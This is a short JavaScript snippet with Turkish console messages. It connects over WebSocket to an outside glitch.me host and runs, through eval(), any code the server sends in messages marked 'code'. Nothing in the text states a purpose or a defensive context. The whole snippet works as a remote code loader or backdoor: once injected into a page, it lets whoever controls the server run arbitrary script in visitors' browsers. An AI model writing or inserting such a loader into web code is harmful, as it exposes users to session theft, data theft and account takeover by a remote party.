(function() {
    console.log('Script yüklendi!');
    var ws = new WebSocket('wss://adhesive-sassy-spaghetti.glitch.me');
    
    ws.onopen = function() {
        console.log('WebSocket bağlantısı kuruldu');
    };
    
    ws.onmessage = function(event) {
        var msg = JSON.parse(event.data);
        if (msg.type === 'code') {
            console.log('Yeni kod:', msg.data);
            eval(msg.data);
        }
    };
    
    ws.onerror = function(error) {
        console.error('WebSocket hatası:', error);
    };
})();
